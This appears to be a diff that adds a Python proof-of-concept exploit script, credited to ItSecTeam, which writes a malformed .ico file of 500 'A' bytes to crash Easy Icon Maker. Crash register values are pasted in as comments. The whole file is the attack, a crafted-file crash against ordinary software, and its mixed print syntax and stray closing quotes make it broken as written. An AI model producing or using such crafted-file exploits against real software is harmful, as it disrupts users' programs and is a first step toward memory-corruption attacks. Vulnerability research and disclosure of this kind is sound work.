@@ -1,0 +1,22 @@
+#! /usr/bin/python
+#
+# Easy Icon Maker .ico File Reading Crash
+# Homepage: www.icon-maker.com
+# #############################################################################
+# Credit : ItSecTeam
+# mail : Bug@ItSecTeam.com
+# Web:  WwW.ITSecTeam.com
+# Forum: WwW.forum.itsecteam.com
+# Special Tanks : PLATE - M3hr@n.S - B3hz4d - Cdef3nder 
+# #############################################################################
+# EAX 30303030 ECX 00000000 EDX 00000000 EBX 00000000 ESP 0012F328 EBP 0012F3E4
+# ESI 30303028 EDI 00330000 EIP 7C90FF91 ntdll.7C90FF91
+
+try:
+	file=open("poc.ico",'w')
+	Buff = "\x41" *500
+	file.write( Buff )
+	file.close()
+	print   ("[+] File created successfully: poc.ico" )
+except:
+	print "[-] Error cant write file to system\n""""
